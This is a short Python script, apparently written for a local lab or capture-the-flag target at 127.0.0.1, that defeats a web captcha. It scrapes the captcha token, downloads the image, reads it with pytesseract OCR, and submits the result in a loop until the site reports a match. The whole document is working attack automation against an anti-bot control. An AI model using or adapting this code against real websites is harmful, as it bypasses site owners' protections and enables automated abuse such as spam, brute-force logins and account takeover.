#!/usr/bin/python3

from pwn import *
import requests, time, os, re, signal, pytesseract, colorama
from colorama import Fore
from PIL import Image

url = "http://127.0.0.1/"

def def_handler(sig, frame):
	print("\n\n[!] Exiting...")
	sys.exit(1)

def GetCaptcha():

	bucle = 0
	while bucle == 0:
		try:
			print("\n--------------")
			s = requests.session()
			response = s.get(url)

			captcha_expression = re.search(r'\d{5,10}', response.text)

			p1 = log.progress("Captcha")
			p1.status("Capturing the captcha value")

			image_url = url + "captcha.php?rand=" + captcha_expression.group(0)
			captcha_image = s.get(image_url)

			f = open("captcha.jpg", "wb")
			f.write(captcha_image.content)
			f.close()

			captcha_value = pytesseract.image_to_string(Image.open('captcha.jpg')).strip()
			print(Fore.YELLOW + "\nThe Captcha Value is --> %s\n" % captcha_value)
			os.remove("captcha.jpg")

			post_data = {
			'captcha': '%s' % (captcha_value),
			'submit': 'Submit'
			}

			r2 = s.post(url, data=post_data)

			if "Your captcha code is match." in r2.text:
				print(Fore.GREEN + "\n[+] Captcha entered succesfully")
				print(Fore.WHITE + "\n--------------")
				bucle = 1
			else:
				print(Fore.RED + "\n[-] Captcha entered incorrectly")
				print(Fore.WHITE + "\n--------------")
		except Exception as e:
			log.failure("Error Validating Captcha")

if __name__ == '__main__':
	GetCaptcha()
